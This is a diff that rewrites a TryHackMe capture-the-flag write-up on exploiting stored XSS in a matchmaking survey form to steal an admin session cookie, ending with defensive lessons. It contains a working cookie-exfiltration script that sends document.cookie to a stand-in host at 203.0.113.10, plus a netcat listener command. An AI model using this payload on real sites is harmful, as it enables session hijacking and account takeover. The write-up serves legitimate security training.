@@ -1,10 +1,10 @@
-# Cupid’s Matchmaker – TryHackMe Writeup
+# TryHackMe – Cupid’s Matchmaker Writeup
 
 ## 1. Introduction
 
-Cupid’s Matchmaker is a beginner-friendly web challenge from TryHackMe’s “Love At First Breach 2026” event that focuses on exploiting a stored XSS vulnerability to steal an admin cookie. The scenario is a matchmaking site that promises “no AI, just real humans reading your personality survey,” which is the main hint that someone privileged will later view your submitted content.
-
-The goal of the room is to inject JavaScript into the survey form so that, when the “human reviewer” (admin/bot) opens it, your payload runs in their browser and exfiltrates their session cookie, which serves as the flag.
+Cupid’s Matchmaker is a beginner-friendly web challenge from TryHackMe’s “Love At First Breach 2026” event that focuses on exploiting a stored XSS vulnerability to steal an admin cookie.  
+The scenario is a matchmaking site that promises “no AI, just real humans reading your personality survey,” hinting that a privileged user will later view your submitted content.  
+The goal is to inject JavaScript into the survey form so that, when the “human reviewer” (admin/bot) opens it, your payload runs in their browser and exfiltrates their session cookie, which serves as the flag.
 
 ---
 
@@ -19,30 +19,32 @@ After starting the room:
   - A human “expert” reviews it.
   - You get matched later.
 
-The important detail here is that the submission will be reviewed later by someone else, which strongly suggests a stored XSS opportunity: my input might be stored and then rendered in another user’s (admin) browser.
+The key detail is that the submission will be reviewed later by someone else.  
+This suggests a stored XSS opportunity: my input might be stored and then rendered in another user’s (admin) browser.
 
-I also quickly clicked around to see available pages (home, survey) and confirmed that the main interactive component is the survey form itself.
+I also clicked around to see all accessible pages (home, survey) and confirmed that the main interactive component is the survey form itself.  
+(Optionally, you can note that basic directory fuzzing didn’t reveal anything more interesting than the main app.)
 
 ---
 
 ## 3. Analysing the Survey Form
 
-Clicking “Take survey” opens a form asking for various details like:
+Clicking **“Take survey”** opens a form asking for various details such as:
 
 - Name and basic profile info.
 - Preferences and what you’re looking for.
-- A free-text area (for example “Tell us about yourself” / “Describe your ideal partner”).
+- A free-text area (e.g., “Tell us about yourself” / “Describe your ideal partner”).
 
-These free-text fields are prime candidates for injection because they often accept arbitrary input and are later displayed back somewhere in the application.
+These free-text fields are prime injection points, because they often accept arbitrary input and are later displayed somewhere else in the application.
 
 Based on the room description and the survey structure, my hypothesis was:
 
-- The survey answers are stored on the server.
+- Survey answers are stored on the server.
 - A reviewer (admin/bot) opens a page that displays those answers.
 - If the application does not properly encode user input, any HTML/JavaScript I submit could execute in the reviewer’s browser.
 - If that JavaScript can access `document.cookie`, I can send the admin’s cookie to my own machine.
 
-This is exactly the type of situation where stored XSS becomes dangerous.
+This is a classic stored XSS scenario.
 
 ---
 
@@ -50,123 +52,118 @@ This is exactly the type of situation where stored XSS becomes dangerous.
 
 To confirm that stored XSS is possible:
 
-- I filled in all required fields with normal, harmless data.
-- In a free-text field (such as “About you”), I injected a simple XSS test payload like:
+1. I filled in all required fields with normal data.
+2. In a free-text field (such as “About you”), I injected a basic XSS test payload:
 
-```html
-<script>alert('XSS');</script>
-
+   ```html
+   <script>alert('XSS');</script>
 I submitted the survey and got a confirmation message saying the team would review my submission.
 
-As the normal user, I did not see the alert box, which is expected for stored XSS. The payload is likely stored in the database and only executed when someone else (the reviewer) opens the submission in their interface.
+As the normal user, I did not see the alert box, which is expected for stored XSS.
+The payload is likely stored in the database and only executed when someone else (the reviewer) opens the submission.
 
-This behavior matches the usual pattern of stored XSS: the malicious script is saved on the server and executes in the browser of whoever loads the affected content later.
+This matches the usual pattern of stored XSS: the malicious script is saved on the server and executed later in another user’s browser.
 
 5. Setting Up a Listener for Cookie Theft
-
 Once I suspected stored XSS in the reviewer view, the next step was to steal the admin’s session cookie when they load my submission.
 
 First, I prepared a listener on my machine:
 
-I chose a dummy public IP for the writeup: 203.0.113.10.
-
-In a real attack, this would be my own VPN/AttackBox IP (for example, from ifconfig on tun0).
+For this writeup, I use a dummy public IP: 203.0.113.10.
+In a real run, this would be your own VPN/AttackBox IP (e.g., from ifconfig on tun0).
 
 I started a netcat listener on port 8080:
 
+bash
 nc -lvnp 8080
-
-This listener will capture any incoming HTTP request. The plan is to have the admin’s browser automatically send a request to http://203.0.113.10:8080 with their cookie attached as a URL parameter.
+This listener will capture any incoming HTTP request.
+The plan is to have the admin’s browser automatically send a request to http://203.0.113.10:8080 with their cookie attached as a URL parameter.
 
 6. Crafting the Final Stored XSS Payload
-
 With the listener running, I created a payload that exfiltrates the admin’s cookie via a simple HTTP request.
 
-I used an Image object to avoid dealing with CORS or fetch restrictions:
+I used an Image object to avoid CORS-related issues and keep the payload simple:
 
+xml
 <script>
   new Image().src = 'http://203.0.113.10:8080/?c=' + document.cookie;
 </script>
-Explanation
+Explanation:
 
 new Image() creates an image object in the browser.
 
 Setting .src makes the browser issue a GET request to the specified URL.
 
-I append document.cookie to the query parameter c.
+I append document.cookie to the c query parameter, so the request looks like:
+GET /?c=<cookie_here> HTTP/1.1 on my listener.
 
-So the request looks like:
+Steps:
 
-GET /?c=<cookie_here> HTTP/1.1
-7. Exploitation
+I returned to the Cupid’s Matchmaker survey page.
 
-I then:
+Filled the required fields again with any values.
 
-Went back to the Cupid’s Matchmaker survey page.
+Placed the payload above into a free-text field (e.g., “About you”).
 
-Filled the required fields again.
-
-Placed the payload into a free-text field (e.g., “About you”).
-
-Submitted the survey and waited for the reviewer.
+Submitted the survey and waited for the reviewer to “check” my response.
 
 When the admin/bot opened my submission, the script executed in their browser context and sent their cookie to my netcat listener.
 
 On my terminal running nc, I saw a request similar to:
 
+text
 GET /?c=session=FLAG_VALUE_HERE HTTP/1.1
 Host: 203.0.113.10:8080
 User-Agent: Mozilla/5.0 ...
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+...
+The critical part is the c parameter in the URL:
 
-The important part is:
-
+text
 /?c=session=FLAG_VALUE_HERE
+The value after session= (or whatever the cookie name is) is the admin’s cookie, which the room uses as the flag.
 
-The value after session= is the admin’s cookie, which serves as the flag.
-
-8. Submitting the Flag
-
+7. Submitting the Flag
 After capturing the request:
 
-Extracted the cookie/flag value from the line starting with GET /?c=...
+I extracted the cookie/flag value from the line starting with GET /?c=....
 
-Copied just the flag portion (e.g., FLAG_VALUE_HERE)
+I copied just the flag portion (e.g., FLAG_VALUE_HERE).
 
-Submitted it in the TryHackMe answer box
+I pasted it into the answer box for the Cupid’s Matchmaker room on TryHackMe.
 
 The submission was accepted, completing the challenge.
 
-9. Lessons Learned
+8. Lessons Learned
+Key takeaways from this room:
 
-From this room, the main security lessons are:
+Stored XSS impact
+Stored XSS is more dangerous than simple reflected XSS because the payload persists on the server and executes in other users’ browsers, often with higher privileges (such as admins or moderators).
 
-Stored XSS is more dangerous than reflected XSS because the payload persists on the server and executes in other users’ browsers, often with higher privileges (like admins).
+High-value targets
+Features involving “human review,” moderation, or admin dashboards are high-risk if user-generated content is rendered without proper HTML escaping.
 
-Features that involve “human review,” moderation, or admin dashboards are high-risk if user-generated content is rendered without proper HTML escaping.
+Cookie theft via XSS
+Stealing cookies via XSS is straightforward when:
 
-Cookie Theft Works Because:
+Cookies are not marked HttpOnly, allowing JavaScript to read document.cookie.
 
-Cookies are not marked HttpOnly, so JavaScript can read document.cookie.
+There is no restrictive Content Security Policy (CSP) to limit exfiltration.
 
-There is no Content Security Policy (CSP) restricting data exfiltration.
+Defenses
+To mitigate this kind of vulnerability, developers should:
 
-Defenses Include:
+Properly encode and sanitize all user-controlled data before inserting it into HTML, attributes, or JavaScript context.
 
-Output encoding/sanitization of user-controlled data
+Use HttpOnly and Secure flags on session cookies.
 
-Using HttpOnly and Secure cookie flags
+Implement a CSP to limit where scripts can load from and send data.
 
-Implementing CSP to restrict script execution and data exfiltration
+From a learning perspective, Cupid’s Matchmaker is useful for practicing:
 
-10. Skills Practiced
+Spotting stored XSS opportunities from application logic and challenge descriptions.
 
-Recognizing stored XSS vulnerabilities
+Writing simple but effective XSS payloads for cookie exfiltration.
 
-Crafting JavaScript payloads
+Setting up listeners and reading raw HTTP requests in a web exploitation scenario.
 
-Cookie exfiltration techniques
-
-Using netcat to capture HTTP requests
-
-Understanding real-world web exploitation
